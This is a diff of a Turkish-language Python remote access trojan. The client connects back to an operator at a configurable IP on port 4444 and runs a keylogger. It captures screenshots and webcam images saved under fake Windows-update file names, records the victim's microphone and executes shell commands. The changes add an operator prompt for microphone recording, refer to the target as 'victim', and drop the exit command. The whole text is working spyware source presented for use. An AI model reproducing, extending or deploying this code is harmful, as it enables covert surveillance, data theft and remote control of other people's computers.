@@ -3,7 +3,7 @@ import os
 import simplejson
 import base64
 import socket
-from util import kg
+import kg
 import time
 import threading
 import pyttsx3
@@ -11,7 +11,10 @@ from PIL import ImageGrab
 import sys
 import shutil
 import cv2
-from util import sound_record
+import sound_record
+
+ip = "192.168.1.105" # Bu değerleri kendinize göre değiştirin.
+port = 4444 # Bu değerleri kendinize göre değiştirin.
 
 my_thread = threading.Thread(target=kg.kg_Start)
 my_thread.start()
@@ -24,9 +27,16 @@ class Soket_baglanti():
         self.ss_dosyasi = os.environ["appdata"] + "\\update.png"
         self.kamera_dosyasi = os.environ["appdata"] + "\\windowsupdate.png"
         self.ses_dosyasi = os.environ["appdata"] + "\\windowssounds.wav"
-        my_thread2 = threading.Thread(target=self.Ses_Kayit_Basla)
-        my_thread2.start()
+        self.Mikrofon_Sorusu()
 
+    def Mikrofon_Sorusu(self):
+        sorunun_cevabi = self.Json_Al()
+        if sorunun_cevabi == "E" or sorunun_cevabi == "e":
+            my_thread2 = threading.Thread(target=self.Ses_Kayit_Basla)
+            my_thread2.start()
+            self.Json_Gonder("[+]Kurbanin mikrofonu kaydedilmeye başlandı.")
+        elif sorunun_cevabi == "H" or sorunun_cevabi == "h":
+            self.Json_Gonder("[+]Kurbanin mikrofonu kaydedilmeyecek.")
 
     def Komut_Calistir(self, komut):
         komut_cikisi = subprocess.check_output(komut, shell=True)
@@ -126,10 +136,7 @@ class Soket_baglanti():
         while True:
             komut = self.Json_Al()
             try:
-                if komut[0] == "cik":
-                    self.baglanti.close()
-                    exit()
-                elif komut[0] == "cd" and len(komut) > 1:
+                if komut[0] == "cd" and len(komut) > 1:
                     komut_cikisi = self.Cd_Calistir(komut[1])
                 elif komut[0] == "indir":
                     komut_cikisi = self.Dosya_Icerigi_Al(komut[1])
@@ -211,7 +218,7 @@ def Baglanti_Dene():
     while True:
         time.sleep(5)
         try:
-            soket = Soket_baglanti("192.168.1.105", 4444) # Bu değerleri kendinize göre değiştirin.
+            soket = Soket_baglanti(ip, port)
             soket.Soket_Basla()
         except Exception:
             Baglanti_Dene()
